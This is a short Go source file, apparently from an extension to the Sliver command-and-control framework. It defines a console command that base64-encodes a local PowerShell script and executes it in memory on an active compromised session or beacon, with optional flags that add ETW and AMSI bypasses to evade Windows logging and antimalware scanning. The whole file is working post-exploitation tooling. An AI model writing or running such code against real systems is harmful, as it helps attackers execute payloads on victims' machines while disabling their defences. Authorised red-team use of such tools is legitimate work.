package powershell

import (
	b64 "encoding/base64"
	"fmt"
	"os"
	"strings"

	"github.com/bishopfox/sliver/client/console"
	"github.com/desertbit/grumble"
)

// PowerShellImportCmd - Import powershell script
func PowerShellImportCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	scriptPath := ctx.Args.String("filepath")
	timeout := ctx.Flags.Int("timeout")
	etwBypass := ctx.Flags.Bool("etw-bypass")
	amsiBypass := ctx.Flags.Bool("amsi-bypass")

	scriptBytes, err := os.ReadFile(scriptPath)
	if err != nil {
		con.PrintErrorf("%s", err.Error())
		return
	}
	sEnc := b64.StdEncoding.EncodeToString([]byte(scriptBytes))

	sliverCommand := "execute-assembly -i"

	if etwBypass {
		sliverCommand += " -E"
	}
	if amsiBypass {
		sliverCommand += " -M"
	}

	con.App.RunCommand(strings.Split(fmt.Sprintf("%s -t %d %s loadmodule%s", sliverCommand, timeout, PSpath, sEnc), " "))

	//con.App.RunCommand(strings.Split(fmt.Sprintf("execute-assembly -t %s -i %s loadmodule%s", timeout, PSpath, sEnc), " "))

}
